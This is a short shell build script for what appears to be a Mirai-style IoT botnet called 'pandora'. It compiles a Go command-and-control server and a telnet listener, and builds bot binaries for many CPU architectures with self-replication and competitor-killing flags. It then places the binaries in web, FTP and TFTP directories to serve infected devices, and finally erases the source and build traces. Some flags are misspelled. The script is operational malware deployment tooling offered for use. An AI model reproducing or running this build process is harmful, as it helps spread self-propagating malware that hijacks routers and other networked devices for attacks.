...
mkdir /var/www/html
mkdir /var/www/html/Pandoras_Box
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o loader/telnetlistener listener.go

compile_bot i586 pandora.x86 "-static -DCUM_KILLER -DSELFREP"
compile_bot mips pandora.mips "-static -DCUM_KILLER -DSELFREP"
compile_bot mipsel pandora.mpsl "-static -DCUM_KILLER -DSELFREP"
compile_bot armv4l pandora.arm "-static -DCUM_KILLER -DSELFREP"
compile_bot armv5l pandora.arm5 ""
compile_bot armv6l pandora.arm6 "-static -DCUM_KILLER -DSELFREP"
compile_bot armv7l pandora.arm7 "-static -DCUM_KILLER -DSELFREP"
compile_bot powerpc pandora.ppc "-static -DCUM_KILLER -DSELFREP"
compile_bot sparc pandora.spc "-static -DCUM_KILLER -DSLEFREP"
compile_bot m68k pandora.m68k "-statiC -DCUM_KILLER -DSELFREP"
compile_bot sh4 pandora.sh4 "-static -DCUM_KILLER -DSELFREP"

cp release/pandora.* /var/www/html/Pandoras_Box
cp release/pandora.* /var/ftp
mv release/pandora.* /var/lib/tftpboot
rm -rf release
...
rm -rf ~/dlr ~/loader/src ~/bot ~/listener.go ~/Projects ~/build.sh
